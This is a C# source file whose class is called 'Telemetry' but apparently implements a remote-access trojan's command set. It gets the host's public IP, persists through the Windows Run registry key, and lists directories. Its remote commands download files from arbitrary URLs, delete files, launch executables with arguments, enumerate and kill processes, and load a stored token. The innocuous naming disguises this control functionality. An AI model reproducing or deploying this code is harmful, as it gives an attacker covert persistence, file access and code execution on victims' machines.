using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Data;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Reflection;

namespace Mimicry.Modules
{
    public class Telemetry 
    {
        public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string mimdir = appdata + "\\mimicry";
        public static string mimlog = mimdir + "\\log";
        public static string mimseslog = mimdir + "\\seslog";
        public static string mimcfg = mimdir + "\\cfg";
        public static string IP;
        
        public Telemetry()
        {
            IP = new WebClient().DownloadString("https://api.ipify.org");
        }

        public void InitializeTelemetry()
        {
            if (!Directory.Exists(mimdir))
            {
                Directory.CreateDirectory(mimdir);
            }
            if (!File.Exists(mimlog))
            {
                File.Create(mimlog);
            }
            File.Delete(mimseslog);
            LogInfo("EXE: Launched");
        }
        
        private static bool IsStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rkApp.GetValue("mimicry") == null)
                return false;
            else
                return true;
        }

        public void SetStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (!IsStartup())
                rkApp.SetValue("mimicry", Assembly.GetExecutingAssembly().Location);
        }

        public void RemoveStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (IsStartup())
                rkApp.DeleteValue("mimicry", false);
        }

        public void LogInfo(string content)
        {
            File.AppendAllText(mimlog, IP + " " + DateTime.Now.ToString("HH:mm:ss tt d.MM.y") + " " + content + "\n");
            File.AppendAllText(mimseslog, IP + " " + DateTime.Now.ToString("HH:mm:ss tt d.MM.y") + " " + content + "\n");
        }

        public string getIP()
        {
            return IP;
        }

        public string LoadLog()
        {
            return File.ReadAllText(mimlog);
        }

        public string LoadSesLog()
        {
            return File.ReadAllText(mimseslog);
        }
        
        public string ShowStructure(string path)
        {
            if (path == "")
            {
                path = "C:\\";
            }
            else if (!Directory.Exists(path))
            {
                return "Incorrect path!";
            }
            string[] subfiles = Directory.GetFiles(path);
            string[] subdirs = Directory.GetDirectories(path);
            string res = "Structure of " + path + "@**" + getIP() + "**\n";
            res += "**Files:** \n";
            foreach (string fileName in subfiles)
                res += fileName + "\n";
            res += "**Directories:** \n";
            foreach (string dirName in subdirs)
                res += dirName + "\n";
            LogInfo("USER: rc.dir " + path);
            return res;
        }

        public string LoadFile(string url, string destname)
        {
            Uri uri = new Uri(url);
            new WebClient().DownloadFileAsync(uri, destname);
            FileInfo dest = new FileInfo(destname);
            LogInfo("USER: rc.load " + destname);
            if (dest.Exists)
            {
                return dest.FullName;
            }
            else
            {
                return "-1";
            }
        }

        public string DelFile(string path)
        {
            LogInfo("USER: rc.del " + path);
            FileInfo dest = new FileInfo(path);
            if (!dest.Exists)
            {
                return "-1";
            }
            File.Delete(path);
            dest.Refresh();
            if (dest.Exists)
            {
                return "-2";
            }
            else
            {
                return "0";
            }
        }

        public void ClearLog()
        {
            File.Delete(mimlog);
        }
        
        public int Execute(string path)
        {
            LogInfo("USER: rc.exec " + path);
            FileInfo toExec = new FileInfo(path);
            if (!toExec.Exists)
            {
                return -1;
            }
            if (toExec.Extension != ".exe")
            {
                return -2;
            }
            ProcessStartInfo proc = new ProcessStartInfo(toExec.FullName);
            Process.Start(proc);
            return 0;
        }

        public int ExecuteWithArgs(string path, string args)
        {
            LogInfo("USER: rc.exec " + path + ", args: " + args);
            FileInfo toExec = new FileInfo(path);
            if (!toExec.Exists)
            {
                return -1;
            }
            if (toExec.Extension != ".exe")
            {
                return -2;
            }
            ProcessStartInfo proc = new ProcessStartInfo(toExec.FullName, args);
            Process.Start(proc);
            return 0;
        }

        public string GetToken()
        {
            if (File.Exists("cfg"))
            {
                File.Move("cfg", mimcfg);
                return File.ReadAllText(mimcfg);
            }
            else
            {
                if (File.Exists(mimcfg))
                {
                    return File.ReadAllText(mimcfg);
                }
                else
                {
                    return "-1";
                }
            }
        }

        public void SetUnsetStartUp(bool set)
        {
            LogInfo("USER: rc.startup, args: " + set.ToString());
            if (set)
            {
                SetStartup();
            }
            else
            {
                RemoveStartup();
            }
        }

        public string GetProcesses()
        {
            LogInfo("USER: rc.getproc");
            Process[] prcs = Process.GetProcesses();
            string res = "";
            for (int i = 0; i < prcs.Length; i++)
            {
                res += "Name: " + prcs[i].ProcessName + ", Memory: " + prcs[i].PagedMemorySize64 .ToString() + ", ID:" + prcs[i].Id + "\n";
            }
            return res;
        }

        public string KillProcess(string id)
        {
            LogInfo("USER: rc.kill");
            int ID = Convert.ToInt32(id);
            try
            {
                Process.GetProcessById(ID).Kill();
            }
            catch (Exception)
            {
                return "-1";
            }
            return "0";
        }
    }
}
